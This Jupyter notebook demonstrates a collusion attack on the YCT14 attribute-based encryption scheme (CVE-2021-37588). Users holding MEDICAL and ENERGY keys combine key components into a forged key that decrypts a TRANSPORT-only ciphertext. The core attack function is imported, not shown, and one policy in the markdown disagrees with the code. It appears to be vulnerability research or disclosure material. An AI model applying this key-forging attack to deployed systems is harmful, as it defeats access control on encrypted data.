{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cef2f861",
   "metadata": {},
   "source": [
    "# Attacking YCT14\n",
    "\n",
    "Attack on the scheme of Yao et al. 2014 (YCT14)\n",
    "presented on \"Enhancement of a lightweight\n",
    "attribute-based encryption scheme for the internet of things\". Based on the collaboration of two\n",
    "users of the system.\n",
    "Performed according to CVE-2021-37588.\n",
    "\n",
    "![title](img/yct14_main.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b752cc3",
   "metadata": {},
   "source": [
    "## Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "013ff4c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "from charm.schemes.abenc.abenc_yct14 import EKPabe                         \n",
    "from charm.toolbox.pairinggroup import PairingGroup,ZR,G1,G2,GT,pair\n",
    "from charm.toolbox.secretutil import SecretUtil\n",
    "from charm.toolbox.symcrypto import SymmetricCryptoAbstraction\n",
    "from charm.toolbox.ABEnc import ABEnc\n",
    "from charm.schemes.abenc.abenc_lsw08 import KPabe\n",
    "from charm.core.math.pairing import hashPair as extractor\n",
    "\n",
    "from abeattacks import attack_yct14\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7d503657",
   "metadata": {},
   "source": [
    "## Example of standard use\n",
    "\n",
    "We generate an universe of attributes based on an example IoT scenario with values TRANSPORT, MEDICAL and ENERGY.\n",
    "We prepare a ciphertext with the policy TRANSPORT or MEDICAL and decrypt it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6bcb2d09",
   "metadata": {},
   "outputs": [],
   "source": [
    "group = PairingGroup('MNT224')\n",
    "kpabe = EKPabe(group)\n",
    "attributes = [ 'TRANSPORT', 'MEDICAL', 'ENERGY']\n",
    "\n",
    "# setup\n",
    "\n",
    "(master_public_key, master_key) = kpabe.setup(attributes)\n",
    "\n",
    "# keygen\n",
    "\n",
    "policy = '(TRANSPORT or MEDICAL)'\n",
    "secret_key = kpabe.keygen(master_public_key, master_key, policy)\n",
    "\n",
    "# encrypt\n",
    "\n",
    "msg = b\"Consumption:3532;Temperature:23;Distance:1\"\n",
    "cipher_text = kpabe.encrypt(master_public_key, msg, attributes)\n",
    "\n",
    "# decrypt\n",
    "\n",
    "decrypted_msg = kpabe.decrypt(cipher_text, secret_key)\n",
    "\n",
    "print(\"Correctness of standard use:\", decrypted_msg == msg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a105e6e",
   "metadata": {},
   "source": [
    "# Presentation of the attack\n",
    "\n",
    "Two users collaborate to decrypt a message encrypted with attribute x = TRANSPORT. These users have attribute y = MEDICAL and attribute z = ENERGY.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5b79d34",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "group = PairingGroup('MNT224')\n",
    "kpabe = EKPabe(group)\n",
    "attributes = [ 'TRANSPORT', 'MEDICAL', 'ENERGY']\n",
    "\n",
    "(master_public_key, master_key) = kpabe.setup(attributes)\n",
    "\n",
    "policy_y = '(MEDICAL)'\n",
    "policy_z = '(ENERGY)'\n",
    "\n",
    "# generation of decryption keys \n",
    "\n",
    "sk_y = kpabe.keygen(master_public_key, master_key, policy_y)\n",
    "sk_z = kpabe.keygen(master_public_key, master_key, policy_z)\n",
    "\n",
    "# generation of target cyphertext and decryption key for user x\n",
    "\n",
    "policy_x = '(TRANSPORT)'\n",
    "sk_x = kpabe.keygen(master_public_key, master_key, policy_x)\n",
    "attr_target_ct = ['TRANSPORT']\n",
    "msg = b\"Distance:353;Model:ACG-E3\"\n",
    "target_ct = kpabe.encrypt(master_public_key, msg, attr_target_ct)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b789edf7",
   "metadata": {},
   "source": [
    "## Attack parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba8c02e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# attack parameters (public)\n",
    "\n",
    "PK = master_public_key\n",
    "p_x = kpabe.attribute['TRANSPORT']\n",
    "p_y = kpabe.attribute['MEDICAL']\n",
    "p_z = kpabe.attribute['ENERGY']\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "28ab2c33",
   "metadata": {},
   "source": [
    "## Phase 1\n",
    "\n",
    "x = TRANSPORT, y = MEDICAL, z = ENERGY\n",
    "\n",
    "Users y and z collaborate to attack x. They ask for decryption keys\n",
    "based on the following policies:\n",
    "\n",
    "    - a1 = y or z\n",
    "    - a2 = x and y\n",
    "    - a3 = z or ( x and y)\n",
    " \n",
    "NOTE: They can do this because they have at least one of the attributes\n",
    "in the policy."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68b6db5d",
   "metadata": {},
   "outputs": [],
   "source": [
    "a_1 = '(MEDICAL or ENERGY)'\n",
    "a_2 = '(TRANSPORT or MEDICAL)'\n",
    "a_3 = 'ENERGY or (TRANSPORT and MEDICAL)'\n",
    "\n",
    "d_a_1 = kpabe.keygen(master_public_key, master_key, a_1)\n",
    "d_a_2 = kpabe.keygen(master_public_key, master_key, a_2)\n",
    "d_a_3 = kpabe.keygen(master_public_key, master_key, a_3)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c22db078",
   "metadata": {},
   "source": [
    "# Phase 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe15e9cf",
   "metadata": {},
   "outputs": [],
   "source": [
    "d_y = d_a_1['Du']['MEDICAL']\n",
    "d_z = d_a_1['Du']['ENERGY']\n",
    "d_u_x = d_a_2['Du']['TRANSPORT']\n",
    "d_u_y = d_a_2['Du']['MEDICAL']\n",
    "d_u_x_prima = d_a_3['Du']['TRANSPORT']\n",
    "d_u_y_prima = d_a_3['Du']['MEDICAL']\n",
    "\n",
    "# We perform the attack\n",
    "\n",
    "d_plus = attack_yct14.yct14_collude_function(d_y, d_z, d_u_x, d_u_y, d_u_x_prima, d_u_y_prima)\n",
    "\n",
    "# We generate a powerful key\n",
    "\n",
    "new_x = {'policy': '(TRANSPORT)', 'Du': {'TRANSPORT': d_plus}}\n",
    "try_decrypt = kpabe.decrypt(target_ct, new_x);\n",
    "assert(try_decrypt == msg)\n",
    "print(\"DECRYPTION ATTACK SUCCESSFUL\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
